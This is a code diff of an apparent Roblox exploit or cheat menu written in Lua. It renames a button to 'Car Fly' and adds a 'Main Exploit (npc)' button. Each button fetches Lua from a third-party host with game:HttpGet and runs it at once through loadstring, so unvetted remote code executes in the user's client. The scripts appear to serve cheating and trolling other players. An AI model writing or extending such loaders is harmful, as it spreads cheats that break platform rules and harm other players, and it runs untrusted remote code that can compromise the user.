@@ -101,9 +101,13 @@ createButton("R6", function()
     loadstring(game:HttpGet('https://korisnik99.neocities.org/message%20(6).txt'))()
 end, 250)
 
-createButton("x64 bypass", function()
+createButton("Car Fly", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/rosploiter/scripts/refs/heads/main/lancet.lua",true))()
 end, 320)
+
+createButton("Main Exploit (npc)", function()
+    loadstring(game:HttpGet('https://robloxtrollers.xyz/loadstring/npc.lua'))()
+end, 370)
 
 createButton("ban notify", function()
     local Players = game:GetService("Players")
